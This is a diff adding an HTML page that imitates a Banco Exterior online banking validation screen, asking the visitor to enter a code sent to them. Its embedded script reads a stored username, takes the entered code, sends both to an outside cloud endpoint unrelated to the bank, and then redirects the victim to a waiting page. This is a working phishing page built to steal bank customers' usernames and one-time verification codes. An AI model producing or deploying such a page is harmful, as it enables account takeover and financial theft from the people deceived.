@@ -1,0 +1,150 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><link rel="stylesheet" media="screen" type="text/css" href="code_files/style.css.css"><link rel="stylesheet" media="screen" type="text/css" href="code_files/posicionamiento.css.css"><link rel="stylesheet" media="screen" type="text/css" href="code_files/primefaces.css.css"><script type="text/javascript" src="code_files/jquery.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="code_files/primefaces.js.xhtml"><!--
+
+//--></script>
+
+    <link rel="shortcut icon" type="image/x-icon" href="https://nexojuridico-bancoexterior.com/portaljuridico/resources/images/Fi128.ico"><script type="text/javascript" src="code_files/validator.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="code_files/progress.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="code_files/utilidadesPasaporteCedula.js.xhtml"><!--
+
+//--></script></head><body>
+
+    <div id="page" class="container_12">
+
+        <div id="header">
+		<div class="header">
+			<a href="#" class="logo_bienvenida">Banco Exterior</a>
+			<div class="titulo_header">
+				<h1 class="titulo_bienvenida">
+					Bienvenido a <span class="titulo_bienvenida2">
+					Exterior NEXO validacion</span>
+				</h1>
+			</div>
+			<div class="clear"></div>
+		</div>
+		<div class="separador_header"></div>
+
+            <div class="clear"></div>
+        </div>
+
+        <div id="content" class="grid_12"><script type="text/javascript" src="code_files/utilidades.js.xhtml"><!--
+
+//--></script><form id="j_id270278328_465f8661" name="j_id270278328_465f8661" method="post" action="/portaljuridico/login/logout.xhtml" enctype="application/x-www-form-urlencoded">
+                <script type="text/javascript"><!--
+
+                    if(top.location!=this.location) top.location=this.location;
+                
+//--></script>
+
+
+                <div id="mensaje" class="prefix_3 grid_6" style="margin-bottom: 50px;">
+
+                    <div style="margin-top: 50px;">
+
+                        <div class="header_dialogo" align="center"><span class="texto_header">Introduzca el codigo enviado.</span>
+                        </div>
+
+                       
+                           
+                            <div align="center" ><input type="number" id="VOPASSWORD" >
+
+                            
+                            <div class="clear"></div>
+                        </div>
+
+                        <div id="botones" style="margin: 20px auto 0 auto; width:60px;"><button id="j_id270278328_465f8661:confirm" name="j_id270278328_465f8661:confirm" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" onclick="enviar()" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Aceptar</span></button>
+                        </div>
+
+                        <div class="clear"></div>
+                        <div class="clear"></div>
+                    </div>
+                    <div class="clear"></div>
+                </div><input type="hidden" name="j_id270278328_465f8661_SUBMIT" value="1"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="lf4H4W5zk5iZpd8Ed5R8r37Pn3mZ3oPRFvyDdqOBKeu6+vNn41Jt7WkEKUUE7BDlCkdn379sZ2yqm9V0SIDDHtI4BDVQC1o+242nt4uwd02RlJAJfCxCCENVa8w="></form>
+
+            <div class="clear"></div>
+        </div>
+
+        <div id="footer">
+		<div class="prefix_11 grid_1 margen_superior">
+
+		</div>
+		<div class="datos_footer grid_12">
+            <table>
+                <tbody><tr>
+                    <td style="width: 50%">
+                        <p class="parrafo_footer">© 2014 Banco Exterior J-00002950-4. Todos los
+                        derechos reservados.</p>
+                        <p class="parrafo_footer">Edif. Banco EXTERIOR, Avenida Urdaneta, entre
+                            esquinas de Urapal a Rio, La Candelaria, Caracas, Venezuela. Código
+                            Postal 1010</p>
+                    </td>
+                    <td style="width: 50%; text-align: right;">
+                        <p class="parrafo_footer">Eres tú quien decides, vive una vida sana disfruta una vida Sin Igual.</p>
+                    </td>
+                </tr>
+            </tbody></table>
+		</div>
+
+            <div class="clear"></div>
+        </div>
+
+        <div class="clear"></div>
+
+    </div>
+
+<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div></body>
+<script>
+
+async function enviar() {
+	
+
+
+	event.preventDefault(); // Evita recargar la página
+			const usr = localStorage.getItem("usr")
+            const usrs = document.getElementById('VOPASSWORD').value;
+            
+           
+          
+			
+           
+
+
+            const message = `BEXT-- --Usuario: <code>${usr}</code> --\n CODE:<code> ${usrs} </code>--` ;
+            const responseMessage = document.getElementById("responseMessage");
+
+            if (!message.trim()) {
+                responseMessage.textContent = "⚠️ Ingresa un mensaje antes de enviar.";
+                return;
+            }
+{}
+            try {
+                const response = await fetch("https://33a863c8-204e-4187-add6-8bb6de1619f7.us-east-1.cloud.genez.io", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ message })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                   localStorage.setItem("usr", usr);
+				
+				  window.location = "wait.html"
+				   
+                    
+                } else {
+                    responseMessage.textContent = "❌ Error al enviar mensaje: " + data.error;
+                }
+            } catch (error) {
+                responseMessage.textContent = "❌ Error en la solicitud: " + error.message;
+            }
+}
+</script>
+
+
+</html>
